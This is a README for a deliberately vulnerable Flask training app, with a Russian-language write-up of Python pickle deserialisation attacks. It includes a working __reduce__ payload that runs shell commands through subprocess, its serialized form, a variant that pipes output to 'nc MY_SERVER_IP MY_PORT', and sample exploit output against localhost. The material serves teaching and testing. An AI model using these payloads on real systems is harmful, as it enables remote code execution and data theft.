# Breakable Flask

A simple vulnerable Flask application.

This can be used to test out and learn exploitation of common web application vulnerabilities. 

Originally written because I wanted a very simple, single page vulnerable app that I could quickly run up to perform exploitation checks against. 

A the moment, the following vulnerabilities are present:
* Python code injection
* Operating System command injection
* Python deserialisation of arbitrary data (pickle)
* XXE injection


New vulnerabilities may be added from time to time as I have need of them.

## Десериализация
Рассмотрим данную уязвимость на примере модуля pickle (python), но эта уязвимость характерна для всех языков использующих сериализаторы объектов, например Java.

### Описание
Пусть имеется два сервиса на python, IPC которых основано на [pickle](https://docs.python.org/3/library/pickle.html). Тогда в их коде будут строки
```python
pickle.dump()
pickle.load()
```
То есть сервис принимает сериализованный объект и десериализует его.
Опишем класс:
```python
class cls3(object):
        def __reduce__(self):
                import subprocess
                return (subprocess.Popen, (('/bin/sh','-c','ls'),))
```
В сериализованном виде экземпляр этого класса будет выглядеть как:
```
csubprocess
Popen
p0
((S’/bin/sh’
p1
S’-c’
p2
S’ls | nc MY_SERVER_IP PORT’
p3
tp4
tp5
Rp6
. 
```
Метод `__reduce__` вызывается при десериализации. То есть код, описанный в этом методе, будет выполнен при десериализации. В этом моменте и состоит уязвимость, т.к. это позволяет исполнять произвольный код, в т.ч. команды shell вслепую. Но с такими возможностями не составляет труда добавить обратную связь:
```python
 return (subprocess.Popen, (('/bin/sh','-c','ls| nc MY_SERVER_IP MY_PORT'),))
 ```
 ### Условия
* ОС: любая
* язык: python,java и др.
* компоненты: библиотеки
* настройки: разные

### Детектирование
Детектирование данной уязвимости возможно только путем отслеживания десериализуемых объектов (если включено логирование)

### Эксплуатация
Возможна как отправка запросов вручную, так и написание эксплойтов

### Инструменты
* Руки
* Python
* BurpSuite

### Ущерб
Выполнение произвольного кода и команд shell

### Защита
* Десериализация объектов только из доверенных источников
* Шифрование сериализованных объектов

### Пример использования
В рамках исследования был написан [эксплойт](https://github.com/primachenko/breakableflask/blob/master/exploit.py) для выполнения произвольных команд shell с получением результата выполнения
```
./exploit.py http://127.0.0.1:4000/cookies 127.0.0.1:3000 /bin/ls -la
total 32
drwxrwxr-x 4 creep creep 4096 Jul  5 22:21 ./
drwxrwxr-x 6 creep creep 4096 Jul  8 14:42 ../
-rwxrwxr-x 1 creep creep 3620 Jul  4 14:34 breakableflask.py*
-rw-rw-r-- 1 creep creep 1063 Jul  3 16:49 COPYRIGHT.txt
drwxrwxr-x 2 creep creep 4096 Jul  3 18:57 example/
-rwxrwxr-x 1 creep creep 1034 Jul  5 22:20 exploit.py*
drwxrwxr-x 8 creep creep 4096 Jul  5 22:23 .git/
-rw-rw-r-- 1 creep creep  566 Jul  3 16:49 README.md
```
